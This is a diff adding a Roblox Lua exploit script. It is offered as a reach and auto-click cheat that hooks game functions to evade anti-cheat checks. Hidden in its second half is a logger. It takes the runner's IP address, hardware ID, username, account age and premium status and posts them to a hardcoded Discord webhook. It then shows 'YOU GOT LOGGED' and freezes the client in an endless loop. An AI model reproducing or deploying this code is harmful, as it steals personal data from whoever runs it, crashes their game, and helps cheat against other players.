@@ -1,0 +1,387 @@
+local TouchingHook
+TouchingHook = hookmetamethod(game, "__namecall", function(...)
+    if getnamecallmethod() == "GetTouchingParts" then
+        return nil
+    end
+    return TouchingHook(...)
+end)
+
+local hook;
+hook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 3 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return hook(...)
+end))
+
+local hook;
+hook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 2 and getcallingscript().Parent == nil then
+        warn("[Event]", "Touch trigger hooked.")
+        return coroutine.yield()
+    end
+    return hook(...)
+end))
+
+
+----------------------------------
+
+getgenv().Circle = {
+    ["Size"] = 5,
+    ["Enabled"] = true,
+    ["Random FTI"] = false,
+    ["Whitelisted Limbs"] = {"Torso", "Right Arm", "Head", "Left Arm", "Right Leg", "Left Leg"}
+}
+
+getgenv().Configuration = {
+    ["Active"] = true,
+    ["Increase Size"] = 0.5,
+    ["Decrease Size"] = 0.5,
+    ["Notifications"] = true,
+    ["Auto Clicker"] = false,
+    ["Transparency Check"] = false,
+    ["Team Check"] = false,
+    ["Fake Handle FTI"] = false 
+}
+
+getgenv().Keybinds = {
+    ["Toggle Reach"] = "R",
+    ["Toggle AC"] = "E",
+    ["Increase Reach"] = "J",
+    ["Decrease Reach"] = "K",
+    ["Toggle Script"] = "Z",
+    ["Notifications Toggle"] = "N",
+    ["Fake Handle FTI Toggle"] = "F"
+}
+
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function SendNotification(Ti,Te)
+    StarterGui:SetCore('SendNotification', {Title = tostring(Ti), Text = tostring(Te)})
+end
+
+local Mouse = LocalPlayer:GetMouse()
+
+Mouse.KeyDown:Connect(function(key)
+    if key == string.lower(getgenv().Keybinds["Toggle Reach"]) then
+        if getgenv().Configuration["Active"] == false then return end
+        getgenv().Circle["Enabled"] = not getgenv().Circle["Enabled"]
+        if getgenv().Configuration["Notifications"] == true then
+            SendNotification("...","Active = "..tostring(getgenv().Circle["Enabled"]))
+        end
+    elseif key == string.lower(getgenv().Keybinds["Toggle AC"]) then
+        if getgenv().Configuration["Active"] == false then return end
+        getgenv().Configuration["Auto Clicker"] = not getgenv().Configuration["Auto Clicker"]
+        if getgenv().Configuration["Notifications"] == true then
+            SendNotification("...","AC =  "..tostring(getgenv().Configuration["Auto Clicker"]))
+        end
+    elseif key == string.lower(getgenv().Keybinds["Fake Handle FTI Toggle"]) then
+        if getgenv().Configuration["Active"] == false then return end
+        getgenv().Configuration["Fake Handle FTI"] = not getgenv().Configuration["Fake Handle FTI"]
+        if getgenv().Configuration["Notifications"] == true then
+            SendNotification("...","Fake Handle = "..tostring(getgenv().Configuration["Fake Handle FTI"]))
+        end
+    elseif key == string.lower(getgenv().Keybinds["Increase Reach"]) then
+        if getgenv().Configuration["Active"] == false then return end
+        getgenv().Circle["Size"] = getgenv().Circle["Size"] + getgenv().Configuration["Increase Size"]
+        if getgenv().Configuration["Notifications"] == true then
+            SendNotification("...","Reach Distance = "..getgenv().Circle["Size"])
+        end
+    elseif key == string.lower(getgenv().Keybinds["Decrease Reach"]) then
+        if getgenv().Configuration["Active"] == false then return end
+        getgenv().Circle["Size"] = getgenv().Circle["Size"] - getgenv().Configuration["Decrease Size"]
+        if getgenv().Configuration["Notifications"] == true then
+            SendNotification("...","Reach Distance = "..getgenv().Circle["Size"])
+        end
+    elseif key == string.lower(getgenv().Keybinds["Notifications Toggle"]) then
+        getgenv().Configuration["Notifications"] = not getgenv().Configuration["Notifications"]
+        SendNotification("...","Notifications = "..tostring(getgenv().Configuration["Notifications"]))
+    elseif key == string.lower(getgenv().Keybinds["Toggle Script"]) then
+        getgenv().Configuration["Active"] = not getgenv().Configuration["Active"]
+        if getgenv().Configuration["Notifications"] == true then
+            SendNotification("...","function = "..tostring(getgenv().Configuration["Active"]))
+        end
+    end
+end)
+
+hookfunction(gcinfo or collectgarbage, function(...)
+    if getgenv().Configuration["Active"] == false then return end
+    return math.random(200,400)
+end)
+
+local DamageHook;
+
+DamageHook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 3 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return DamageHook(...)
+end))
+
+local TouchTriggerHook;
+
+TouchTriggerHook = hookfunc(getrenv().wait, newcclosure(function(...)
+    local args = {...}
+    if args[1] == 2 and getcallingscript().Parent == nil then
+        return coroutine.yield()
+    end
+    return TouchTriggerHook(...)
+end))
+
+local HitParts = {}
+local t = tick()
+
+local FTI = function(hit,handle)
+    local Humanoid = hit.Parent:FindFirstChild("Humanoid")
+    if Humanoid and Humanoid.Health ~= 0 and hit.Parent.Name ~= LocalPlayer.Character.Name then
+        if getgenv().Configuration["Transparency Check"] == true then if hit.Transparency > 0.8 then return end end
+        local Region = Region3.new(handle.Position + Vector3.new(-1,-1,-1), handle.Position + Vector3.new(1,1,1))
+        local InRegion = game:GetService("Workspace"):FindPartsInRegion3(Region)
+        if getgenv().Configuration["Fake Handle FTI"] then
+            for _,v in pairs(InRegion) do
+                if v:IsA("Part") and v:FindFirstChildOfClass("TouchTransmitter") and v.Name ~= "Handle" then
+                    if getgenv().Circle["Random FTI"] == true then
+                        for i,parts in pairs(hit.Parent:GetChildren()) do
+                            if parts:IsA("Part") then
+                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
+                                    if not table.find(HitParts,parts.Name) then
+                                        if #HitParts >= 3 then table.clear(HitParts) end
+                                        table.insert(HitParts,parts.Name)
+                                        if math.abs(tick() - t) < 0.02 then return end
+                                        t = tick()
+                                        firetouchinterest(parts,v,0)
+                                        firetouchinterest(parts,v,1)
+                                        firetouchinterest(parts,handle,0)
+                                        firetouchinterest(parts,handle,1)
+                                    end
+                                end
+                            end
+                        end
+                    else
+                        for i,parts in pairs(hit.Parent:GetChildren()) do
+                            if parts:IsA("Part") then
+                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
+                                    firetouchinterest(parts,v,0)
+                                    firetouchinterest(parts,v,1)
+                                    firetouchinterest(parts,handle,0)
+                                    firetouchinterest(parts,handle,1)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        else
+            for _,v in pairs(InRegion) do
+                if v:IsA("Part") and v:FindFirstChildOfClass("TouchTransmitter") then
+                    if getgenv().Circle["Random FTI"] == true then
+                        for i,parts in pairs(hit.Parent:GetChildren()) do
+                            if parts:IsA("Part") then
+                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
+                                    if not table.find(HitParts,parts.Name) then
+                                        if #HitParts >= 3 then table.clear(HitParts) end
+                                        table.insert(HitParts,parts.Name)
+                                        if math.abs(tick() - t) < 0.02 then return end
+                                        t = tick()
+                                        firetouchinterest(parts,v,0)
+                                        firetouchinterest(parts,v,1)
+                                    end
+                                end
+                            end
+                        end
+                    else
+                        for i,parts in pairs(hit.Parent:GetChildren()) do
+                            if parts:IsA("Part") then
+                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
+                                    firetouchinterest(parts,v,0)
+                                    firetouchinterest(parts,v,1)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+local IsTeam = function(Player)
+    if Player.Team == LocalPlayer.Team then
+        return true
+    else 
+        return false
+    end
+end
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    if getgenv().Configuration["Active"] == false then return end
+    if getgenv().Circle["Enabled"] == false then return end
+    local Tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
+    if Tool then
+        if getgenv().Configuration["Auto Clicker"] and LocalPlayer.Character.Humanoid.Health ~= 0 then Tool:Activate() Tool:Activate() end
+        local Handle = Tool:FindFirstChild("Handle")
+        if Handle then
+            local Size = getgenv().Circle["Size"]
+            if getgenv().Configuration["Team Check"] == true then
+                for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+                    if IsTeam(v) == false then
+                        local HRP = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
+                        if HRP then
+                            local Distance = (HRP.Position - Handle.Position).Magnitude
+                            if Distance <= Size then
+                                FTI(HRP,Handle)
+                            end
+                        end
+                    end
+                end
+            else
+                for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+                    local HRP = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
+                    if HRP then
+                        local Distance = (HRP.Position - Handle.Position).Magnitude
+                        if Distance <= Size then
+                            FTI(HRP,Handle)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "YOU GOT LOGGED", 
+	Text = "LOOOOOOOOOOOOOOL", 
+})
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "CRASHING GAME", 
+	Text = " ", 
+})
+
+
+game.Players.PlayerAdded:Connect(function(plr)
+    plr.CharacterAdded:Connect(function(char)
+       local humanoid = char:WaitForChild("Humanoid")
+       humanoid.WalkSpeed = 50
+    end)
+end)
+
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/1092371391996756028/o9OOc5COb4SNH3prTgjPBgTGtfcK-xTOfU7rwq6TSqsW-EGcZJvSB93bsXtNyeV3urEB"
+
+
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "LOGGED",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "ALT:",
+					["value"] = ALT,
+					["inline"] = true
+				},
+
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+wait(10)
+_G.errorchecks = true
+while _G.errorchecks == true do
+    print("...")
+end
